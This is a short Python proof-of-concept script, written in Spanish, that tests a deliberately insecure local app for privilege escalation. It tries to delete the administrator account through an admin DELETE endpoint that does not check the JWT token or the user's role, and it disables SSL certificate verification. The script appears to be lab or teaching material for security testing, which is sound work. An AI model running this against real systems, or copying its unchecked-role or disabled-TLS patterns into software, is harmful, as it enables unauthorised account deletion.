import urllib.request
import json
import ssl

print("==========================================================")
print("  PRUEBA DE HACKEO - ESCALADA DE PRIVILEGIOS (FASE 2)     ")
print("==========================================================")

# Configuramos la petición para ignorar advertencias SSL si las hubiera localmente
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# ID del usuario administrador que vamos a intentar borrar
TARGET_USER_ID = 2

url = f'http://127.0.0.1:8001/api/admin/delete_user/{TARGET_USER_ID}'

# Simulamos ser un usuario "normal" haciendo una petición a un endpoint de "admin"
# El endpoint es vulnerable porque no verifica el token JWT ni el rol en el backend
req = urllib.request.Request(
    url, 
    method='DELETE',
    headers={
        'Content-Type': 'application/json', 
        'User-Agent': 'Mozilla/5.0',
        'user-role': 'user' # Somos un usuario normal
    }
)

print(f"[*] Intentando eliminar el usuario con ID {TARGET_USER_ID} (Administrador)...")
print("[*] Somos un usuario normal sin permisos.")

try:
    with urllib.request.urlopen(req, context=ctx) as response:
        print("\n[+] ¡ÉXITO (VULNERABILIDAD EXPLOTADA)!")
        print("Status Code:", response.getcode())
        print("Respuesta:", response.read().decode())
        print("\nExplicación: El sistema permitió a un usuario sin privilegios acceder a una ruta administrativa.")
except urllib.error.HTTPError as e:
    print("\n[-] ACCESO DENEGADO (SISTEMA SEGURO)")
    print("Status Code:", e.code)
    print("Respuesta:", e.read().decode())
except Exception as e:
    print("\n[!] Error de conexión:", str(e))
    print("Asegúrate de que 'app_insegura.py' se esté ejecutando en el puerto 8001.")
